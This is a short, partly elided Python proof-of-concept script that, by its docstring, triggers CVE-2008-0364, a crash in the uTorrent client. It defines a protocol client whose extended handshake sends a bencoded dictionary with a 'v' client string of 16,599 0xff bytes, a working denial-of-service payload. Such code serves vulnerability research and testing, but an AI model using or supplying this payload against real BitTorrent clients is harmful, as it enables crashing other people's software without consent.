"""
This script triggers the vulnerability detailed in CVE-2008-0364; a uTorrrent
client crash resulting from a very long client string.
...
class Client(protocol.Protocol):
    ...
    def send_extended(self):
        ...
        payload = '\xff'*16599
        #bencode dictionary
        bdict = 'd1:ei0e1:md6:ut_pexi1ee1:pi0e1:v%s:' %len(payload) + payload + 'e'
